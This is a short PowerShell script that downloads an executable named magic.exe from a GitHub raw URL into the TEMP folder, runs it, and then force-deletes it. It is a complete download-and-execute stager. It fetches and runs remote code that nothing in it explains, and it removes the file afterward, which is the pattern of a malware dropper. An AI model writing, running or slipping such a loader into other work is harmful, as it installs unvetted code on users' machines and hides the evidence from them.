# Define the URL to download the exe file (replace the placeholder with the actual URL)
$exeUrl = "https://github.com/padsalatushal/padsalatushal.github.io/raw/main/Random_stuff/magic.exe"

# Define the path to the temp folder
$tempFolderPath = "$env:TEMP"

# Define the name of the downloaded exe file (you can use a specific name or keep the original file name)
$downloadedExeName = "downloaded.exe"

# Combine the temp folder path and the downloaded exe file name
$downloadedExePath = Join-Path -Path $tempFolderPath -ChildPath $downloadedExeName
Write-Host $downloadedExePath

try {
    # Download the exe file using WebClient
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($exeUrl, $downloadedExePath)
    $webClient.Dispose()

    # Run the downloaded exe file
    Start-Process -FilePath $downloadedExePath -Wait

    # Remove the downloaded exe file after execution
    Remove-Item -Path $downloadedExePath -Force

    Write-Host "Execution complete. The downloaded file has been deleted."
}
catch {
    Write-Host "An error occurred: $_"
}
